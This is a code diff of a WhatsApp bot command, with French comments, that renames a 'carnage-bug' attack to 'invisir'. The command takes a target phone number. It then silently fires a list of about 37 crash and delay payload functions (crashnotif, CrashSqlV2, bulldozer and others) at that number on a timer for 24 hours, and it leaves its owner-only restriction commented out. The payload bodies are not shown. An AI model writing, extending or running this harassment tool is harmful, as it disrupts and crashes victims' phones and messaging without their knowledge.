@@ -2979,26 +2979,27 @@ async function blankPACKING(prim, target) {
 //     COMMANDE
 
 export default {
-  name: "carnage-bug",
-  description: "Carnage-Bug 24h silencieux (aucune confirmation)",
+  name: "invisir",
+  alias: ["attaque", "invisi"],
+  description: "Carnage-Bug 24h silencieux (aucune confirmation) sur un numéro",
 
-  async execute(context) {
-    const { sock, from, msg, args } = context;
+  async execute(sock, msg, args, from) {
+    // Décommentez les lignes suivantes pour restreindre au propriétaire
+    // const sender = msg.key.remoteJid.endsWith("@g.us") ? msg.key.participant : msg.key.remoteJid;
+    // const senderNum = sender.split("@")[0].replace(/[^0-9]/g, "");
+    // const ownerNum = global.owners?.[0];
+    // if (senderNum !== ownerNum) {
+    //   return sock.sendMessage(from, { text: "❌ Seul le propriétaire peut utiliser cette commande." });
+    // }
 
     let targetNumber = args?.[0] || "";
-
     if (!targetNumber) {
-      return sock.sendMessage(from, { 
-        text: "❌ Numéro manquant\n.carnage-bug 237xxxxxxxx" 
-      }, { quoted: msg });
+      return sock.sendMessage(from, { text: "❌ Numéro manquant\n.carnage-bug 237xxxxxxxx" }, { quoted: msg });
     }
 
     targetNumber = targetNumber.replace(/[^0-9]/g, "");
-    
     if (targetNumber.length < 8) {
-      return sock.sendMessage(from, { 
-        text: "❌ Numéro invalide" 
-      }, { quoted: msg });
+      return sock.sendMessage(from, { text: "❌ Numéro invalide" }, { quoted: msg });
     }
 
     const target = targetNumber + "@s.whatsapp.net";
@@ -3010,50 +3011,19 @@ export default {
     let count = 0;
 
     const actions = [
-    intdress,
-iNTofmSqL,
-iNTxSqL,
-dandelionlay,
-NullMemek,
-gsCp,
-jokowi,
-crashnotif,
-invisblekontak,
-Delaybulldor,
-CrashSqlV2,
-Delaymaklo,
-tes,
-Vsx,
-ZenoEphemerals,
-VsxCrashDelay,
-D9XDELAYV2,
-Available01,
-ofmCrashSql,
-blankv1,
-Abcefghh,
-HomoSigmaWing,
-xxx,
-HardBukQIM,
-ofmEr,
-vfz,
-epcihDiley,
-DelaFreezCloseRelay,
-BetaTester,
-protocolbug3,
-delayMakerInvisible,
-VampBroadcast,
-bulldozer,
-CrashBeta,
-KresKontak,
-AdminBokep,
-blankPACKING
+      intdress, iNTofmSqL, iNTxSqL, dandelionlay, NullMemek,
+      gsCp, jokowi, crashnotif, invisblekontak, Delaybulldor,
+      CrashSqlV2, Delaymaklo, tes, Vsx, ZenoEphemerals,
+      VsxCrashDelay, D9XDELAYV2, Available01, ofmCrashSql,
+      blankv1, Abcefghh, HomoSigmaWing, xxx, HardBukQIM,
+      ofmEr, vfz, epcihDiley, DelaFreezCloseRelay, BetaTester,
+      protocolbug3, delayMakerInvisible, VampBroadcast, bulldozer,
+      CrashBeta, KresKontak, AdminBokep, blankPACKING
     ];
 
-
-    // Lancement silencieux
+    // Lancement silencieux (aucun message de confirmation)
     const interval = setInterval(async () => {
       count++;
-
       for (const fn of actions) {
         try {
           if (typeof fn === "function") {
@@ -3063,16 +3033,15 @@ blankPACKING
           console.error(`Erreur fonction ${fn.name || ""}`, err);
         }
       }
-
       if (count >= totalExecutions) {
         clearInterval(interval);
-        global.carnageInterval = null;
+        if (global.carnageInterval === interval) global.carnageInterval = null;
       }
     }, intervalMinutes * 60 * 1000);
 
     global.carnageInterval = interval;
 
-    // Aucun message envoyé après le démarrage
+    // Aucun message envoyé après démarrage (silencieux)
     console.log(`[CARNAGE] Démarré silencieusement sur ${targetNumber} pour 24h`);
   }
 };
